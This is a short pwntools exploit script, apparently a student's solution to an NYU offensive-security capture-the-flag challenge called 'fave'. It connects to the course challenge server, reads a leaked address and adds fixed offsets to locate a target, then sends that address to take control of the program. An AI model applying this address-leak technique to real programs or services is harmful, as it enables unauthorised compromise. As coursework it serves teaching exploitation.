from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "fave"
PORT = 1251
NETID = b"os2178"
LOCAL = False

if LOCAL:
	p = process(CHALLENGE)
else:
	p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
	p.recvuntil(b"NetID (something like abc123): ")
	p.sendline(NETID)

hintOffset = "0x12a9"
beverageOffset = "0x43f8"

print(p.recvuntil(b': '))
hintAddress = p.recvuntil("\n").strip()
hintAddress = hintAddress[::-1]
hintAddress = "0x" + hintAddress.hex()

beverageAddress = (int(hintAddress, 16) - int(hintOffset, 16) + int(beverageOffset, 16))
beverageAddress = str(beverageAddress)

print(beverageAddress)
print(type(beverageAddress))
print(p.recvuntil(b"> "))
p.sendline(beverageAddress)
p.interactive()